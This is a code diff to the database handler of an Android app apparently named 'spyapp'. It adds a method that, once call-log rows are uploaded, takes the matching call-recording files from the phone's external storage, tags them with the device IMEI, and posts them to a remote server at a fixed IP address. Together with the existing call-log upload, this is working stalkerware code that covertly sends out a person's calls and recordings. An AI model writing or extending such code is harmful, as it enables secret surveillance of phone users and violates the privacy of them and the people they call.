@@ -1,7 +1,14 @@
 package com.example.spyapp;
 
+import java.io.DataInputStream;
+import java.io.DataOutputStream;
+import java.io.File;
+import java.io.FileInputStream;
 import java.io.IOException;
 import java.io.UnsupportedEncodingException;
+import java.net.HttpURLConnection;
+import java.net.MalformedURLException;
+import java.net.URL;
 import java.util.ArrayList;
 import java.util.List;
 
@@ -19,6 +26,7 @@ import android.content.Context;
 import android.database.Cursor;
 import android.database.sqlite.SQLiteDatabase;
 import android.database.sqlite.SQLiteOpenHelper;
+import android.os.Environment;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 
@@ -352,8 +360,8 @@ public class DatabaseHandler {
                 nameValuePairs.add(new BasicNameValuePair("TIMESTAMP", cursor.getString(0)));
                 nameValuePairs.add(new BasicNameValuePair("TYPE", cursor.getString(1)));
                 nameValuePairs.add(new BasicNameValuePair("DURATION", cursor.getString(2)));
-		nameValuePairs.add(new BasicNameValuePair("TOFROM", cursor.getString(3)));
-		nameValuePairs.add(new BasicNameValuePair("FILENAME", cursor.getString(4)));
+                nameValuePairs.add(new BasicNameValuePair("TOFROM", cursor.getString(3)));
+                nameValuePairs.add(new BasicNameValuePair("FILENAME", cursor.getString(4)));
                              
                 try {
 					httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
@@ -374,6 +382,7 @@ public class DatabaseHandler {
 		                	cv.put("UPLOADED",1);
 			        		SQLiteDatabase db2 = dbhelper.getWritableDatabase();
 		                	db2.update(CALL_TABLE_NAME,cv,"TIMESTAMP="+cursor.getString(0), null);
+		                	uploadRecording(cursor.getString(4));
 		                	db2.close();
 		            
 		                }
@@ -394,7 +403,89 @@ public class DatabaseHandler {
 	}
 
 	
+	private void uploadRecording(String file_to_be_uploaded) {
+
+	    HttpURLConnection conn = null;
+	    DataOutputStream dos = null;
+	    DataInputStream inStream = null;
+	    String existingFileName = file_to_be_uploaded;
+	    String lineEnd = "\r\n";
+	    String twoHyphens = "--";
+	    String boundary = "*****";
+	    int bytesRead, bytesAvailable, bufferSize;
+	    byte[] buffer;
+	    int maxBufferSize = 1 * 1024 * 1024;
+	    String responseFromServer = "";
+	    String urlString = "http://192.168.1.146:83/upload_recording.php";
+        String filepath = Environment.getExternalStorageDirectory().getPath();
+	    File file = new File(filepath,"SAPP");
+	    try {
+
+	    	existingFileName= file.getAbsolutePath() + "/" +existingFileName;
+	    	Log.d(TAG,"existingFileName:"+existingFileName);
+	    	file_to_be_uploaded=IMEI+"-"+file_to_be_uploaded;
+	    	Log.d(TAG,"file_to_be_uploaded:"+file_to_be_uploaded);
+
+	        //------------------ CLIENT REQUEST
+	        FileInputStream fileInputStream = new FileInputStream(new File(existingFileName));
+	        // open a URL connection to the Servlet
+	        URL url = new URL(urlString);
+	        // Open a HTTP connection to the URL
+	        conn = (HttpURLConnection) url.openConnection();
+	        // Allow Inputs
+	        conn.setDoInput(true);
+	        // Allow Outputs
+	        conn.setDoOutput(true);
+	        // Don't use a cached copy.
+	        conn.setUseCaches(false);
+	        // Use a post method.
+	        conn.setRequestMethod("POST");
+	        conn.setRequestProperty("Connection", "Keep-Alive");
+	        conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
+	        dos = new DataOutputStream(conn.getOutputStream());
+	        dos.writeBytes(twoHyphens + boundary + lineEnd);
+	        dos.writeBytes("Content-Disposition: form-data; name=\"file\";filename=\"" + file_to_be_uploaded + "\"" + lineEnd);
+	        dos.writeBytes(lineEnd);
+	        // create a buffer of maximum size
+	        bytesAvailable = fileInputStream.available();
+	        bufferSize = Math.min(bytesAvailable, maxBufferSize);
+	        buffer = new byte[bufferSize];
+	        // read file and write it into form...
+	        bytesRead = fileInputStream.read(buffer, 0, bufferSize);
+
+	        while (bytesRead > 0) {
+
+	            dos.write(buffer, 0, bufferSize);
+	            bytesAvailable = fileInputStream.available();
+	            bufferSize = Math.min(bytesAvailable, maxBufferSize);
+	            bytesRead = fileInputStream.read(buffer, 0, bufferSize);
+
+	        }
+
+	        // send multipart form data necesssary after file data...
+	        dos.writeBytes(lineEnd);
+	        dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
+	        // close streams
+	        Log.e("Debug", "File is written");
+	        int serverResponseCode = conn.getResponseCode();
+	        String serverResponseMessage = conn.getResponseMessage();
+
+	        Log.d(TAG,"Upload file to serverHTTP Response is : "
+	            + serverResponseMessage + ": " + serverResponseCode);
+	        // close streams
+
+	        fileInputStream.close();
+	        dos.flush();
+	        dos.close();
+
+	    } catch (MalformedURLException ex) {
+	        Log.e("Debug", "error: " + ex.getMessage(), ex);
+	    } catch (IOException ioe) {
+	        Log.e("Debug", "error: " + ioe.getMessage(), ioe);
+	    }
+
 	
+	}
 	  public String[][] getAllvalues() {
 	        
 		  
